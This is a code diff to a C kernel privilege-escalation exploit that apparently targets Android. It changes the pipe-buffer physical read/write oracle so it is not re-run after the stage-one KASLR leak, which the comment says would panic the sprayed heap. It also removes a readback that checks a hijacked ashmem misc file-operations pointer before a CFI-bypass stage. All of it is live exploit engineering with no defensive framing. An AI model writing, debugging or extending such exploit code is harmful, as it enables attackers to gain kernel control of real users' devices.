@@ -230,11 +230,17 @@ int run_exploit(int argc, char **argv) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reset_pipe_attempt();
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  /* The physical p0 KASLR leak (slide_leak_kernel_base) already ran
+   * prepare_p0_pipe_oracle() and set pipebuf_page_base.  Re-running the
+   * KernelSnitch sk_buff leak via prepare_pipe_buffer_page() on the
+   * already-sprayed heap panics, so only prepare when stage 1 did not. */
   if (!is_direct_ptr(pipebuf_page_base)) {
-    return 1;
+    reset_pipe_attempt();
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+    if (!is_direct_ptr(pipebuf_page_base)) {
+      return 1;
+    }
   }
 #endif
 
@@ -247,11 +253,6 @@ int run_exploit(int argc, char **argv) {
   }
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
-    uintptr_t misc_fops_addr = data_addr(ASHMEM_MISC_FOPS);
-    uint64_t misc_fops_val = pipe_read64(0, misc_fops_addr);
-    pr_info("MISCFOPS_READBACK triggered=%d target=%016zx value=%016llx want=%016zx\n",
-            triggered, misc_fops_addr, (unsigned long long)misc_fops_val,
-            (uintptr_t)fake_fops);
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
